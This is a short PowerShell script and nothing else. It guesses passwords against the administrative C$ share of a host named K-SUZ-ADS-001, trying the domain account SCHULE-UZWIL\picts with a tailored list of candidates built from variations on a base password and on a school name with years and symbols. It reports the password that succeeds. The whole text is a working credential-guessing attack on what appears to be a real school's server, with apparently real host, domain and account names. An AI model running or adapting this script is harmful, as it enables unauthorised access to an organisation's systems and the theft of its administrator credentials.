$candidates = @(
    'SuZPicTS9244!',
    'SuZPicTS9244!2026',
    'SuZPicTS9244!2025',
    'SuZPicTS9244!2024',
    'SuZPicTS9244!2023',
    'SuZPicTS9244!2026!',
    'SuZPicTS9244!2026@',
    'SuZPicTS9244!2026#',
    'SuZPicTS9244!@2026',
    'SuZPicTS9244!#2026',
    'SuZPicTS9244!2026!@#',
    'SuZPicTS9244!26',
    'SuZPicTS9244!25',
    'SuZPicTS9244!24',
    'SuZPicTS9244!23',
    'SuZPicTS!2026',
    'SuZPicTS2026!',
    'SuZPicTS2025!',
    'Schule.Uzwil9240',
    'Schule.Uzwil9240!',
    'Schule.Uzwil9240#',
    'Schule.Uzwil9240@',
    'Schule.Uzwil2026',
    'Schule.Uzwil2026!',
    'Schule.Uzwil2025!',
    'Schule.Uzwil2019!'
)
foreach ($password in $candidates) {
    $share = '\\K-SUZ-ADS-001\C$'
    $output = cmd /c "net use $share /user:SCHULE-UZWIL\picts `"$password`" /persistent:no 2>&1"
    if ($LASTEXITCODE -eq 0) {
        Write-Output ('SUCCESS=' + $password)
        $null = cmd /c "net use $share /delete /y 2>&1"
        break
    }
    $null = cmd /c "net use $share /delete /y 2>&1"
}
